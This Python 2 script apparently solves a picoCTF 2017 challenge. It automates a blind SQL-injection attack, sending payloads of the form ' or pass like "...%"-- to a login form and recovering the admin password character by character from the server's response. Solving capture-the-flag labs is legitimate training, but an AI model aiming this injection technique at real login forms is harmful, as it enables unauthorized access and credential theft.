import httplib, urllib
import string


continue_msg = "Flag is 63 characters"
fail_msg = "Incorrect Password."
alphabet = string.letters + string.digits + "_"

def send_request_with_pass(passw):
	params = urllib.urlencode({'username': 'admin', 'password': passw})
	headers = {"Content-type": "application/x-www-form-urlencoded",
            "Accept": "text/plain"}
	conn = httplib.HTTPConnection("shell2017.picoctf.com:33838")
	conn.request("POST", "/", params, headers)
	response = conn.getresponse()
	data = response.read()
	conn.close()
	return data

go_on = True
passwd = ""
while go_on:
	for ch in alphabet:
		result = send_request_with_pass("' or pass like \"" +passwd + ch + "%\"--")
		if continue_msg in result:
			passwd += ch
			print passwd
			break
		if ch is alphabet[-1]:
			go_on = False
		if fail_msg in result:
			continue
		else:
			print result
			go_on = False
print passwd


